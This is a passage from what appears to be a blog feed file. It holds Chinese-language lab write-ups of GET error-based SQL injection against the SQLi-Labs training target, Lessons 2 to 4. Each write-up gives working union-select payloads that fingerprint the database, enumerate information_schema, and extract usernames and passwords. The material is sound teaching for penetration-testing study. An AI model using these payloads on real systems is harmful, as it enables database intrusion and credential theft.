src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆出users表的所有列名.png" alt="爆出users表的所有列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-4/index.php?id=-1") union select 1,username,password from users where id=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-DoubleQuotes-String/爆字段值.png" alt="爆字段值"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=(&quot;参数&quot;);</code></li><li>未进行转义、过滤等</li><li>可使用双引号判断注入类型</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-ErrorBasd-SingleQuotesWithTwist-String</title>
      <link href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-singlequoteswithtwist-string/"/>
      <url>/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-singlequoteswithtwist-string/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-3/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/正常访问结果展示.png" alt="正常访问结果展示"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-1/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=(&#39;参数&#39;) limit 0，1;</code>，<font color="red">参数为<code>String</code>型而且SQL语句中使用单引号(``)和圆括号界定该参数</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">') or ('</span><span class="token number">1</span><span class="token string">')=('</span><span class="token number">1</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&#39;) or (&#39;1&#39;)=(&#39;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/or恒真payload操作结果.png" alt="or恒真payload操作结果"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/order by 1操作结果.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/order by 2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/order by 3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/order by 4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/union select语句SQL注入回显判断.png" alt="union select语句SQL注入回显判断"></center><p>注：</p><ul><li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li></ul></li><li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,user(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,database(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,version(),3--+</span><span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,@@datadir,3--+</span><span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,@@version_compile_os,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/获取当前用户信息.png" alt="获取当前用户信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/获取数据库名称.png" alt="获取数据库名称"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/获取数据库所在路径.png" alt="获取数据库所在路径"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/获取服务器系统版本信息.png" alt="获取服务器系统版本信息"></center></li><li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/爆所有数据库名称.png" alt="爆所有数据库名称"></center></li><li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/爆security数据库中所有表名.png" alt="爆security数据库中所有表名"></center></li><li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/爆users表中所有列名.png" alt="爆users表中所有列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-3/index.php?id=-1') union select 1,username,password from users where id=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-SingleQuotesWithTwist-String/爆字段值.png" alt="爆字段值"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=(&#39;参数&#39;);</code></li><li>未进行转义、过滤等</li><li>可使用单引号判断注入类型</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-ErrorBasd-IntigerBased</title>
      <link href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-intigerbased/"/>
      <url>/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-intigerbased/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、数值型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-2/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/正常访问结果显示.png" alt="正常访问结果显示"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-2/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=参数 limit 0，1;</code>，<font color="red">参数为<code>Intiger</code>型</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1 or 1=1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/or恒真payload构造.png" alt="1 or 1=1payload的操作结果"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby1.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/unionselect语句判断SQLi回显位置.png" alt="unionselect语句判断SQLi回显位置"></center><p>注：</p><ul><li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li></ul></li><li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,user(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,database(),3--+</span><span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,version(),3--+</span><span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,@@datadir,3--+</span><span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,@@version_compile_os,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取当前用户信息.png" alt="获取当前用户信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取当前数据库名称.png" alt="获取当前数据库名称"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取数据库版本信息.png" alt="获取数据库版本信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取数据库路径信息.png" alt="获取数据库路径信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取服务器系统的版本信息.png" alt="获取服务器系统的版本信息"></center></li><li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出所有数据库名称.png" alt="爆出所有数据库名称"></center></li><li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出Security数据库中所有数据表名称.png" alt="爆出Security数据库中所有数据表名称"></center></li><li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出users表中所有列名称.png" alt="爆出users表中所有列名称"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,username,password from users where id=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆字段值.png" alt="爆字段值"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=参数;</code></li><li>未进行转义、过滤等</li><li>可使用单引号判断注入类型</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-ErrorBased-SingleQuotes-String</title>
      <link href="/2020/10/17/sql-zhu-ru-zhi-get-errorbased-singlequotes-string/"/>
      <url>/2020/10/17/sql-zhu-ru-zhi-get-errorbased-singlequotes-string/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBased-SingleQuotes-String/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 